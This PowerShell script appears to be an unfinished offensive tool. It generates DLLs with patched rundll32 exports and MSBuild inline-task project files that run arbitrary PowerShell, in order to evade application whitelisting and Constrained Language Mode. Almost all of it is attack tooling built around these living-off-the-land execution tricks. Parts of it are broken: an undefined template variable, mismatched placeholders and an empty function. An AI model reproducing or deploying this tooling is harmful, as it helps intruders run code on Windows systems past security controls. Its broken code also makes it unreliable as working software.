#TODO
# fix new dll template to work with rundll

# Convert all commands to base64 commands for the new template





function Csproj-Pwn
{
<#
.SYNOPSIS
	
.DESCRIPTION
	
	
.PARAMETER DllName
	

.PARAMETER Entry
	

.PARAMETER Command
	

.PARAMETER Build
	

.EXAMPLE
	
	
#>

param
(
    [Parameter()]
    [string]$DllName,
	
    [Parameter(Mandatory)]
    [string]$Entry,
	
	[Parameter(Mandatory)]
    [String]$Command,

    [Parameter()]
    [switch]$Build
				
)


begin
{
    $global:csproj = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="Oops">
<ByClm/>
</Target>
<UsingTask
TaskName="ByClm"
TaskFactory="CodeTaskFactory"
AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
<Task>
<Reference Include="System.Management.Automation" />		
<Code Type="Class" Language="cs">
<![CDATA[
$global:exesrc
]]>
</Code>
</Task>
</UsingTask>
</Project>
"@

}
}



function Create-AppIl
{
<#
.SYNOPSIS
	Generates a dll with an arbitary Entrypoint and powershell commands. 
	Author: p4yl0ad (p4yl0ad@protonmail.com)  
	License: BSD 3-Clause  
	Required Dependencies: System[.]Management[.]Automation[.]dll in current working directory

.DESCRIPTION
	Utilizes System[.]Management[.]Automation[.]Runspaces in order to create a powershell runspace
	
.PARAMETER DllName
	Specifies the Name for the dll, if ommited iso standard date will be used for the binary

.PARAMETER Entry
	Specifies the Entry point for the dll

.PARAMETER Command
	The command to be executed in the powershell runspace

.PARAMETER Build
	Build the il to a dll with a patched entrypont

.EXAMPLE
	Create-AppIl -DllName test1 -Entry test2 -Command test4 -Build
	Create-AppIl -DllName "ayylmao" -Entry "Poon" -Command "$ExecutionContext.SessionState.LanguageMode > C:\Windows\Tasks\bypass.txt" -Build	
#>
param
(
    [Parameter()]
    [string]$DllName,
	
    [Parameter(Mandatory)]
    [string]$Entry,
	
	[Parameter(Mandatory)]
    [String]$Command,

    [Parameter()]
    [switch]$Build
				
)


begin
{
    $global:DllName = $DllName
    $global:Entry = $Entry
    $global:Command = $Command.Replace("\","\\")
    $global:Build = $Build



    $global:dllsrc = @"
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management.Automation;


namespace Oopsnamespace
{
	public class Oopsclass
	{
		public static void Main()
        	{
        	}
        	public class Code
        	{
			public static void Exec()
	        	{
				PowerShell ps = PowerShell.Create().AddCommand("powershell.exe").AddParameter("([char]45+[char]101+[char]99)", "{BASE64COMMAND}");
		        	ps.Invoke();
	        	}
        	}
    	}
}
"@

    $global:exesrc = @"
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management.Automation;

namespace Oops
{
    class Oops
    {
        static void Main(string[] args)
        {
	        #C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:System.Management.Automation.dll /platform:x64 /t:exe /unsafe /out:\rastalabs\payloads\oops.exe C:\rastalabs\payloads\oops.cs
	        PowerShell ps = PowerShell.Create().AddCommand ("cmd.exe").AddParameter("/c", "start").AddParameter("cmd.exe","");
	        ps.Invoke();
        }
    }
}
"@
    $global:cscpath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    $global:ilasm = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe"
    $global:ildasm = "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\x64\ildasm.exe"
    $global:smadll = "C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\3.0\System.Management.Automation.dll"
}


Process{
    if (Test-Path $cscpath)
    {
    	Write-Host "csc.exe found"
    	if (Test-Path $ildasm)
    	{
		    Write-Host "ildasm.exe found"
		    if (Test-Path $smadll)
		    {	
    			Write-Host "System.Management.Automation.dll found"
			    Write-Host "Ready to proceed"
			    if ($DllName.Length -eq '0')
			    {
				    Write-Host "Did not supply name"
				    $global:DllName = Get-Date -f yyyy-MM-dd-ss
				    Invoke-FileCreate($DllName, $Command)
			    }
			    Invoke-FileCreate	
		    }
	    }
    }
}
}

function Invoke-FileCreate {
    Write-Host $global:DllName
    Write-Host $global:Entry
    Write-Host $global:Command
    $global:fin = $src.Replace("{PEPEGA}",$Command)
    Write-Host $global:fin
    $global:fin2 = $global:fin.Replace("Exec",$Entry)
    Write-Host $global:fin2
    $global:srcfile = $global:DllName + ".cs"
    $global:fin2 | Out-File $global:srcfile
    Invoke-DllMove
}

function Invoke-DllMove{
    copy "C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\3.0\System.Management.Automation.dll" .\System.Management.Automation.dll 
    Invoke-Compile
}

function Invoke-Compile{
     & $global:cscpath /platform:anycpu /reference:System.Management.Automation.dll /target:library /unsafe $global:srcfile #evildll.cs
     #del $global:srcfile 
     Invoke-ToIl
}

function Invoke-ToIl{
    $global:patchilname = "patched_" + $global:DllName + ".il" #patched_evildll.il

    $global:patchdllname = "patched_" + $global:DllName + ".dll" #patched_evildll.dll
    $global:todel = "patched_" + $global:DllName + ".res"
    $global:DllNamedll = $global:srcfile = $global:DllName + ".dll" #evildll.dll
    & $global:ildasm /out:$global:patchilname $global:DllNamedll
    #del $global:todel
    #del $global:DllNamedll
    
    if ($Build)
    {
        Write-Host "build"
        Invoke-EditExport
        Invoke-Recompile
    }
    else{
        Invoke-EditExport
        Write-Host "Convert to base64 using https://github.com/FortyNorthSecurity/CLM-Base64 "
        Write-Host "ipmo .\CLM-Base64.ps1; ConvertTo-Base64 -FilePath C:\pwd\evil.il | clip"
    }

}


function Invoke-EditExport{
    (gc $global:patchilname) -replace ".maxstack  2", ".export [1]`n`t$&" | sc $global:patchilname
}

function Invoke-Recompile{
    & $global:ilasm $global:patchilname /DLL /output=$global:patchdllname
    Write-Host "rundll32.exe $global:patchdllname,$global:Entry"
}
